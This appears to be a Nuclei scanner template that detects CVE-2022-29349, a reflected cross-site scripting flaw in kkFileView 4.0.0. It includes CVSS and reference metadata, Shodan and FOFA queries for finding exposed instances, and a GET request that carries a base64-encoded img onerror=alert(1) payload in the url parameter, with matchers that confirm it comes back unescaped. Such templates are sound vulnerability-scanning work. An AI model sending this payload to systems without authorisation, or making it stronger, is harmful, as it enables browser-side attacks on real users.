id: CVE-2022-29349

info:
  name: kkFileView 4.0.0 - Cross-Site Scripting
  author: arafatansari
  severity: medium
  description: |
    kkFileView 4.0.0 contains multiple cross-site scripting vulnerabilities via the urls and currentUrl parameters at /controller/OnlinePreviewController.java.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute malicious scripts in the context of the victim's browser, potentially leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Apply the latest security patch or upgrade to a newer version of kkFileView to mitigate the XSS vulnerability.
  reference:
    - https://github.com/kekingcn/kkFileView/issues/347
    - https://nvd.nist.gov/vuln/detail/CVE-2022-29349
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-29349
    cwe-id: CWE-79
    epss-score: 0.02663
    epss-percentile: 0.85213
    cpe: cpe:2.3:a:keking:kkfileview:4.0.0:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: keking
    product: kkfileview
    shodan-query:
      - http.html:"kkFileView"
      - http.html:"kkfileview"
    fofa-query:
      - body="kkfileview"
      - app="kkfileview"
  tags: cve,cve2022,kkFileView,xss,keking

http:
  - method: GET
    path:
      - "{{BaseURL}}/onlinePreview?url=aHR0cDovL3d3dy54eHguY29tL3h4eC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPjEyMw%3D%3D"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'txt"><img src=111 onerror=alert(1)>123'

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
# digest: 4a0a004730450220152216d8b3561a26cda969d2aaf014187a59365b1a2c323ecf128f7fa8c7b626022100f77d8e5f6f90f3ad322e06535b0992f6d72fb13247914a8d6c7e963f01cb70a0:922c64590222798bb761d5b6d8e72950